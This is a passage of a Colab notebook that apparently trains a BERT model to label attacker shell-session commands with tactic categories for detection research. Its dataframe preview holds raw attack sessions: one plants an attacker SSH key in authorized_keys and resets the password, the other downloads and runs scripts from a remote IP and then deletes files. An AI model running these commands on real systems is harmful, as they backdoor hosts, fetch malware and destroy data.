              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-f3872325-73bb-46fa-81f5-af025bc4b6a5 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-f3872325-73bb-46fa-81f5-af025bc4b6a5');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-b0b659f2-4e94-4889-a02c-1e98b65ccbde\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-b0b659f2-4e94-4889-a02c-1e98b65ccbde')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-b0b659f2-4e94-4889-a02c-1e98b65ccbde button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "summary": "{\n  \"name\": \"display(test_data\",\n  \"rows\": 2,\n  \"fields\": [\n    {\n      \"column\": \"session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo -e qwertynnR7l3jFafBtNnnR7l3jFafBtN | passwd | bash ; Enter new UNIX password: ; echo qwertynnR7l3jFafBtNnnR7l3jFafBtNn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\",\n          \"cd /tmp || cd /run || cd / ; wget http://93.114.82.154/nitebins.sh ; chmod 777 nit ebins.sh ; sh nitebins.sh ; tftp 93.114.82.154 -c get nitetftp1.sh ; chmod 777 nite tftp1.sh ; sh nitetftp1.sh ; tftp -r nitetftp2.sh -g 93.114.82.154 ; chmod 777 nite tftp2.sh ; sh nitetftp2.sh ; rm -rf nitebins.sh nitetftp1.sh nitetftp2.sh ; rm -rf * ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"bert_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"uni_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo -e qwertynnR7l3jFafBtNnnR7l3jFafB | passwd | bash ; Enter new UNIX password: ; echo qwertynnR7l3jFafBtNnnR7l3jFafB | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\",\n          \"cd /tmp || cd /run || cd / ; wget http://93.114.82.154/nitebins. ; chmod 777 nit ebins.sh ; sh nitebins.sh ; tftp 93.114.82.154 -c get nitetftp1.sh ; chmod 777 nite tftp1.sh ; sh nitetftp1.sh ; tftp -r nitetftp2.sh -g 93.114.82.154 ; chmod 777 nite tftp2.sh ; sh nitetftp2.sh ; rm -rf nitebins.sh nitetftp1.sh nitetftp2.sh ; rm -rf * ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_bert_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"trunc_uni_tokenized\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "print(f\"Train dataset contains {train_data.shape[0]:,} elements\")\n",
        "print(f\"Testing dataset contains {test_data.shape[0]:,} elements\")\n",
        "display(train_data.head(2))\n",
        "display(test_data.head(2))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pij2I3FW3Cml",
        "outputId": "58678a7b-8fa2-4640-a9b6-1e0b6b03acf2"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "New training dataset contains 200 elements\n",
            "Validation dataset contains 51 elements\n"
          ]
        }
      ],
      "source": [
        "train_data_split, val_data_split = train_test_split(train_data, test_size=0.2, random_state=42)\n",
        "print(f\"New training dataset contains {train_data_split.shape[0]:,} elements\")\n",
        "print(f\"Validation dataset contains {val_data_split.shape[0]:,} elements\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "43_uddpw3Cml",
        "outputId": "75d44b42-07b8-403b-a728-379b29d9915b"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "DatasetDict({\n",
              "    train: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized'],\n",
              "        num_rows: 200\n",
              "    })\n",
              "    valid: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized'],\n",
              "        num_rows: 51\n",
              "    })\n",
              "    test: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized'],\n",
              "        num_rows: 108\n",
              "    })\n",
              "})"
            ]
          },
          "metadata": {},
          "execution_count": 25
        }
      ],
      "source": [
        "full_ds = DatasetDict(\n",
        "    {\n",
        "        \"train\": Dataset.from_pandas(train_data_split.reset_index(drop=True)),\n",
        "        \"valid\": Dataset.from_pandas(val_data_split.reset_index(drop=True)),\n",
        "        \"test\": Dataset.from_pandas(test_data.reset_index(drop=True)),\n",
        "    }\n",
        ")\n",
        "full_ds"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "s4yw7sc13Cml",
        "outputId": "652dbfd9-738c-4aad-f914-3ac611f77150"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['Execution',\n",
              " 'Discovery',\n",
              " 'Persistence',\n",
              " 'Defense Evasion',\n",
              " 'Not Malicious Yet',\n",
              " 'Other',\n",
              " 'Impact']"
            ]
          },
          "metadata": {},
          "execution_count": 26
        }
      ],
      "source": [
        "unique_labels = list(train_data.label.explode().unique())\n",
        "unique_labels"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 385,
          "referenced_widgets": [
            "6758c37c11674591b26dd48041b61280",
            "480164cad27e4081aa5e12987ebc2d70",
            "08b60741279f467a926bd442c9adfa2f",
            "3016c4878a42404a8ba11effde973f3a",
            "2f0b41a15daa44c787492fef074608e0",
            "7b1d9b5ca0644c4e88ecbe5a18c12a8a",
            "f0314f41c53643d0b33a4404b5cf9315",
            "e8587272a43244baad43e7953d2bb47e",
            "6e34586f55e6470797a28caa68781b20",
            "d19287635ad34f62989d8c1b7fe292b0",
            "7a92a7aef8c64992b066966e74bf8b31",
            "60e230776cc0452fa600d6be35a487ca",
            "a9fd93b12f694b22ab9e0be106c3ea98",
            "6f3950bcf8b94b218e04c6951af2b6de",
            "a475834f34644b2a8c6c627980b0b9f7",
            "3ed03423d00f4098807b8e49d889c27f",
            "356cefe42fdf48fabb0771dd5b296bfb",
            "2fe54ad804b44d46bb551c909ae3f1b8",
            "09ba907cc1bb497c8c8a6a26368bd202",
            "11db1f9eef37494d8e172d288e33063e",
            "9bbe09b174a34a40ae30ad5cf5ab30e6",
            "3439b2fd744146d0a6dc826909d84874",
            "713c46ab023644b5ad8b6248a6c0dfc7",
            "2df7b07355c9424ebf8bdfd4f67d48ae",
            "eee6bdf13f694f898a031f91cbeb560c",
            "16caf7044666433293beffd3083c8019",
            "0311b183728543cdaccac08b8c8d6c2b",
            "6e3bd20555bb40849274c155c888d9ef",
            "2cb11c6d9b0642adb4eb21f8c0d44956",
            "f884e8cf09174cfab1c608b9506454a9",
            "73f18f8edefb4241b5f58f11827aff7e",
            "f2d4e27fc5644d0a99328ad33feb66be",
            "26c35402f0674e60b25f9ff369fa30e5"
          ]
        },
        "id": "ziffjYTO3Cmm",
        "outputId": "81b1da5b-d317-4c6b-83b0-af1b3ad4e8db"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "{'Execution': 0, 'Discovery': 1, 'Persistence': 2, 'Defense Evasion': 3, 'Not Malicious Yet': 4, 'Other': 5, 'Impact': 6}\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/200 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "6758c37c11674591b26dd48041b61280"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/51 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "60e230776cc0452fa600d6be35a487ca"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/108 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "713c46ab023644b5ad8b6248a6c0dfc7"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "DatasetDict({\n",
              "    train: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized', 'label_id'],\n",
              "        num_rows: 200\n",
              "    })\n",
              "    valid: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized', 'label_id'],\n",
              "        num_rows: 51\n",
              "    })\n",
              "    test: Dataset({\n",
              "        features: ['session', 'label', 'bert_tokenized', 'uni_tokenized', 'trunc_session', 'trunc_bert_tokenized', 'trunc_uni_tokenized', 'label_id'],\n",
              "        num_rows: 108\n",
              "    })\n",
              "})"
            ]
          },
          "metadata": {},
          "execution_count": 27
        }
      ],
      "source": [
        "id2label = {it:label for it, label in enumerate(unique_labels)}\n",
        "label2id = {label:it for it, label in enumerate(unique_labels)}\n",
        "print(label2id)\n",
        "\n",
        "def convert_labels_to_ids(sample):\n",
        "    sample['label_id'] = [label2id[el] for el in sample[\"label\"]]\n",
        "    return sample\n",
        "\n",
        "encoded_dataset = full_ds.map(convert_labels_to_ids)\n",
        "encoded_dataset"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 145,
          "referenced_widgets": [
            "0a9f3dbc5b5b45fa991f5fcaf4902bf3",
            "42020bebc7e241a69ab54c7965e1e8ca",
            "aacf6c5601004340a01e6e13bdce27e6",
            "0e022fd15e7a4313b71ec904871da5b4",
            "6abf91e1033d4686b8e2b57c3bf001c1",
            "846e4772b067433bb333d783ef3158aa",
            "e3887d8e7d9242fba9a729e19a8fa0ac",
            "a18654b1d3ca4a018d7bf8c5556cb742",
            "301b9de2877344f2953d40608476f9b4",
            "f58c20c8acc14665a423c7f63f605a2c",
            "8d19079ee7054121aad0bceb6ba69a02",
            "6d86e028f9b34f6a88927910721e8680",
            "5f934ef8c8694ba2823d8aef803c3d5e",
            "2cf56b2ad236497c9e776f54b3462844",
            "1e4809dc1c4e4762ab6f01d77ac54db5",
            "91345cecce8b47eb9248d1245ff83c11",
            "9fbde9c473734efa9fd9b502f2f9a7a6",
            "59c3280acfc84f9f849c750cfc532c76",
            "943e9f126c9e4d3d854ae164d3257825",
            "26c09b682fff477e8bdc02f242faa61d",
            "64a84fc0b2f0468c887bb851662559f8",
            "6f69b5a680004e41bf0bfb92bdaf3e03",
            "cfab97e8fb98485eb188191b91389bd0",
            "c2a032fd45884c2396690e3ca631ee20",
            "5b58a9b3e1d149d9991dde6f7b61a95f",
            "87be1924982a4424a143cc192d8364ca",
            "8aa44af8d503425a8984e2f0beee23d2",
            "787a6020def24c4e865fd407743fd356",
            "1e6f1026458c421ba32be592554483cb",
            "69312cbb4fbd4e189f3f26f025ab05f1",
            "bda06d441fda4288a3458f3f77b162a2",
            "43ee34cdba0f4bb1b2d77a57e70d30d9",
            "2d3b0426a2b341be9e550e4de7be4b2d",
            "aa53a7c9453a438ca77062ea087e099f",
            "e4e8ec5e4b434550ac0e7f29aa7e9fa9",
            "4bcfcdb786854824af7138a92865d30f",
            "55a8ffa7722d49bf969f6286e732a065",
            "4edcf2e3ef944aff8de0b2d52731583b",
            "985709d9ce5c4c0a8babae7b420a02fd",
            "0b6ea13fddb34040ba424454a9546f9a",
            "91a621d981974326a46fbc528c7faa64",
            "4470f6b7603345a39152c4ad3ba95448",
            "176b6db04cd64231b40e9f8487d1a375",
            "73ba0cd7bed5412b82107dc2d3b220b7"
          ]
        },
        "id": "mgfOPwuR3Cmm",
        "outputId": "90be2feb-851c-4404-9b35-44256a475d22"
      },
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/48.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "0a9f3dbc5b5b45fa991f5fcaf4902bf3"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/570 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "6d86e028f9b34f6a88927910721e8680"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "cfab97e8fb98485eb188191b91389bd0"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/466k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "aa53a7c9453a438ca77062ea087e099f"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "model = \"google-bert/bert-base-uncased\"\n",
        "tokenizer = AutoTokenizer.from_pretrained(model, add_prefix_space=True)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Fx6dLEAR3Cmm"
      },
      "outputs": [],
      "source": [
        "def align_labels_with_tokens(labels, word_ids):\n",
        "    new_labels = []\n",
        "    current_word = None\n",
        "    for word_id in word_ids:\n",
        "        if word_id != current_word:\n",
        "            # Start of a new word or special token\n",
        "            current_word = word_id\n",
        "            # Use -100 for special tokens, otherwise use the original label\n",
        "            label = -100 if word_id is None else labels[word_id]\n",
        "            new_labels.append(label)\n",
        "        elif word_id is None:\n",
        "            # Special token (like [CLS], [SEP], etc.)\n",
        "            new_labels.append(-100)\n",
        "        else:\n",
        "            # Continuation token of the current word\n",
        "            # We assign the same label as the word\n",
        "            label = labels[word_id]\n",
        "            new_labels.append(label)\n",
        "    return new_labels\n",
        "\n",
        "def tokenize_and_align_labels(samples):\n",
        "    # Remember: we need to split the sentences\n",
        "    split_sentences = [sentence.split(\" \") for sentence in samples[\"trunc_session\"]]\n",
        "\n",
        "    # Tokenize all examples in batch using the global tokenizer\n",
        "    tokenized_inputs = tokenizer(\n",
        "        split_sentences,\n",
        "        truncation=True,  # Truncate to max length if needed\n",
        "        is_split_into_words=True  # Input is already split into words\n",
        "    )\n",
        "    # Extract all label_id lists from the examples\n",
        "    all_labels = samples[\"label_id\"]\n",
        "    new_labels = []\n",
        "    # Process each example's labels individually\n",
        "    for i, labels in enumerate(all_labels):\n",
        "        # Get word ID mapping for the current example\n",
        "        word_ids = tokenized_inputs.word_ids(i)\n",
        "        # Convert word-level labels to token-level labels\n",
        "        aligned_labels = align_labels_with_tokens(labels, word_ids)\n",
        "        new_labels.append(aligned_labels)\n",
        "    # Add the aligned labels to the tokenized inputs\n",
        "    tokenized_inputs[\"labels\"] = new_labels\n",
        "    return tokenized_inputs\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 367,
          "referenced_widgets": [
            "98ef522c1c5847649c1ea21d0580de27",
            "dc72def2241b4c1aa26b7bff8f77c00b",
            "9c788471135e4a6b9b755b8b19be9ca1",
            "aa50fea583ed49069f011f256059b985",
            "e9d6bc181f2b436dbed569924c757495",
            "6ab27da393244198b78473f843849482",
            "20b1b70870314fcaa03b1c664b4df09d",
            "6e681a16c6f940499c09bddbcb6a3962",
            "4b8eb6b50d65452597a3bd2d7515e048",
            "50e44ab22885453fb04841aa4e5b4c6e",
            "8838348844a44f21a6ca9ff20d5c4fdf",
            "51f072cb47574dc79e90c0b13d756f7d",
            "9c29241b1ff54539ab073d738931d457",
            "573195052aef4defa2b7febd0164c6be",
            "30896cedc87b4e68816405312e0e74e4",
            "811d6197d2c14edb85644173fff7517e",
            "c29713154e9c4a30887c6b3b36874a7a",
            "bcd326e3c4eb4d499aff501b57942610",
            "3fc346a44f1f47a78486441f5c0a5afa",
            "2e3458f2b88a4a20b2e97de6330d2ff4",
            "2fe1d28f3d644e2898a3954d32d86d8b",
            "840b0271b7424cfab3977df07868de64",
            "78131d6f53964a3aa3b4b2242da3ff01",
            "245bb141cc3141cc9798b6ad1021d2c8",
            "92d0249aedd54bba9d970123fc75bdc3",
            "9f88c5f13811448abace7890e912e67f",
            "594e89d9abc748bf96268a51fc5f6f09",
            "521ac5e2d1164d65822de33d847d0a3e",
            "171b7eb09e9b4a979d8ae8be947a6be8",
            "af23ff279be04bc19d0666df7304f859",
            "75b521c3a80d44f593096e329466388e",
            "38ee58bfbee041ad957356b987ab1bcf",
            "8426bdb896994d66bf12eab048cab03d"
          ]
        },
        "id": "zJJ4e_FI3Cmn",
        "outputId": "ae1ae23b-69b9-49e1-bc76-15ec0909b670"
      },
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/200 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "98ef522c1c5847649c1ea21d0580de27"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/51 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "51f072cb47574dc79e90c0b13d756f7d"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Map:   0%|          | 0/108 [00:00<?, ? examples/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "78131d6f53964a3aa3b4b2242da3ff01"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "DatasetDict({\n",
              "    train: Dataset({\n",
              "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
              "        num_rows: 200\n",
              "    })\n",
              "    valid: Dataset({\n",
              "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
              "        num_rows: 51\n",
              "    })\n",
              "    test: Dataset({\n",
              "        features: ['input_ids', 'token_type_ids', 'attention_mask', 'labels'],\n",
              "        num_rows: 108\n",
              "    })\n",
              "})"
            ]
          },
          "metadata": {},
          "execution_count": 30
        }
      ],
      "source": [
        "original_columns = encoded_dataset[\"train\"].column_names\n",
        "tokenized_datasets = encoded_dataset.map(\n",
        "    tokenize_and_align_labels,\n",
        "    batched=True, # Can be performed in batches, in order to speed up times!\n",
        "    remove_columns=original_columns, # To remove the original columns\n",
        ")\n",
        "tokenized_datasets"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "3FBX1rSf3Cmn"
      },
      "outputs": [],
      "source": [
        "data_collator = DataCollatorForTokenClassification(tokenizer=tokenizer)\n",
        "\n",
        "train_dataloader = DataLoader(\n",
        "    tokenized_datasets[\"train\"],\n",
        "    shuffle=True,\n",
        "    collate_fn=data_collator,\n",
        "    batch_size=16,\n",
        ")\n",
        "eval_dataloader = DataLoader(\n",
        "    tokenized_datasets[\"valid\"], collate_fn=data_collator, batch_size=16\n",
        ")\n",
        "test_dataloader = DataLoader(\n",
        "    tokenized_datasets[\"test\"], collate_fn=data_collator, batch_size=16\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DtK-IwlN3Cmn",
        "outputId": "d93e16a3-fc8e-494b-f2ca-da60c0d93252"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "BertForTokenClassification(\n",
              "  (bert): BertModel(\n",
              "    (embeddings): BertEmbeddings(\n",
              "      (word_embeddings): Embedding(30522, 768, padding_idx=0)\n",
              "      (position_embeddings): Embedding(512, 768)\n",
              "      (token_type_embeddings): Embedding(2, 768)\n",
              "      (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
              "      (dropout): Dropout(p=0.1, inplace=False)\n",
              "    )\n",
              "    (encoder): BertEncoder(\n",
